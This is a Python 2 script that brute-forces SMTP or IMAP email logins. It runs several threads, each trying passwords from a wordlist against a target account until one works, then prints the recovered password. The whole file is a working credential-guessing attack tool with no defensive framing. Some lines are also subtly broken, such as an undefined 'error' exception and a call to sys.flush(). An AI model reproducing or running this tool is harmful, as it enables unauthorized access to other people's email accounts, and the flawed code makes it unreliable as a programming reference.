# -*- coding: utf-8 -*-
from __future__ import unicode_literals

import sys
import argparse

import smtplib
from smtplib import SMTPAuthenticationError

import imaplib

import threading

# connection_handler = None
done = False
result = None
# mutex = threading.Lock()
passwords = []
passwords_count = 0

def make_connection_handler(host,port,type_='smtp'):
    print ('host,port = {}, {}'.format(host,port))
    if type_ == 'smtp':
        print ('using smtp')
        connection_handler = smtplib.SMTP()
        # connection_handler.starttls()
        connection_handler.connect(host,int(port))
    else:
        print ('using imap...')
        connection_handler = imaplib.IMAP4(host,int(port))
    return connection_handler

def check(handler,user,password):
    try:
        handler.login(user,password)
        return True
    except SMTPAuthenticationError:
        return False
    except error:
        return False
    except Exception,e :
        print ('E"{} - {}"'.format(password,e))
        return False

def load_passwords(file):
    global passwords
    global passwords_count
    with open(file,'rt') as f:
        while True:
            password = f.readline().strip()
            if password == '':
                break
            passwords.append(password)
    passwords_count = len(passwords)
    passwords = iter(passwords)

def get_password():
    try:
        return passwords.next()
    except StopIteration:
        return False

def worker(index, host,port,login,type_):
    print ('{}:worker has been started...'.format(index))
    global result
    global done
    while  done == False:
        print ("{}:getting password...".format(index))
        password=get_password()
        if password == False:
            break
        print ("{}:password='{}'".format(index,password))
        print ("{}:making connection...".format(index))
        handler = make_connection_handler(host, port,type_)
        print ("{}:checking {}".format(index,password))
        res = check(handler, login, password)
        if res != False:
            result = password
            done = True
            return
        print ("P'{}' is checked".format(password))
        sys.flush()


def bruteforce(host,port,login, threadscount,passwordsfile,type_):
    global passwords_count
    print("Loading passwords list...")
    load_passwords(passwordsfile)
    print ("Done: {} passwords has been loaded".format(passwords_count))
    print ("Starting to bruteforce...")
    threads = map(
            lambda x: threading.Thread(
                    target=worker,
                    args=(x,host,port,login,type_)
                ),
            range(threadscount)
        )
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    print ("Done")
    return result


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
            '--host',
            dest='host',
            help='smtp|imap host'
        )
    parser.add_argument(
            '--port',
            dest='port',
            type=int,
            help='smtp|imap server port'
        )
    parser.add_argument(
            '--threads',
            dest='threadscount',
            type=int,
            default=10,
            help='threads count'
        )
    parser.add_argument(
            '--login',
            dest='login',
            help='user login to brute...'
        )
    parser.add_argument(
            '--dict',
            dest='dictionary',
            help='dictionary file'
        )
    parser.add_argument(
            '--type',
            dest='type_',
            default='smtp',
            help='choise the protocol to connect stmp|imap4'
        )
    args = parser.parse_args()
    if any(
            map(
                lambda x: x is None,
                (args.host,args.port,args.login,args.dictionary)
            )
        ):
        parser.print_help()
        sys.exit()
    print ('password is {}'.format(
            bruteforce(
                    args.host,
                    args.port,
                    args.login,
                    args.threadscount,
                    args.dictionary,
                    args.type_
                )
        )
    )


if __name__ == "__main__":
    main()